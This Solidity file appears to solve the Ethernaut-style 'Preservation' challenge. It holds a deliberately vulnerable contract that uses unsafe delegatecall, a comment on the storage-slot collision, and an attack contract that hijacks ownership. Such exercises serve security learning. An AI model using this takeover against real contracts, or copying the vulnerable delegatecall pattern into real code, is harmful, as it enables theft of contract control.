// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

// Thoughts
// 
// Delegate call carries the caller storage which implies
// storage slot collision, thus, we want to do the following
//     1. set the time as the attacker contract address
//     2. call setTime again, which will invoke attacker contract
//     3. attacker contract will exploit the slot collision
// 

contract PreservationSolution {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    function solve(address _challengeAddress) external {
        Preservation challenge = Preservation(_challengeAddress);
        challenge.setFirstTime(uint256(address(this)));
        challenge.setFirstTime(uint256(address(this)));
    }

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}